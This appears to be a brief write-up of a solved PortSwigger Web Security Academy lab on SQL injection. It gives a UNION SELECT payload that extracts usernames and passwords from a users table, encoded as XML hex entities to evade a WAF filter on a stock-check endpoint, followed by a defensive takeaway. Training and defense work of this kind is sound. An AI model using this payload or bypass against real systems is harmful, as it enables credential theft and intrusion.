# PortSwigger SQL Injection — SQL injection with filter bypass via XML encoding

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: PRACTITIONER
- Result: solved

## Technique

XML hex entity WAF bypass

## Key details

- Injection/object: `POST /product/stock`
- Table/columns/channel: `storeId XML`
- Key result: `zruo7b9fm16mf4fo8o1f`

## Payload

```text
hex_entities(1 UNION SELECT username || '~' || password FROM users)
```

## Notes

This lab belongs to the advanced half of PortSwigger's SQL injection track. The workflow is to identify the available oracle or output channel, extract the administrator credential if required, and log in as administrator to trigger the solved state.

## Defensive takeaway

Parameterized queries are the root fix. Error suppression, WAF filters, and metadata permission reduction are useful defense-in-depth, but they do not replace binding untrusted input as data.
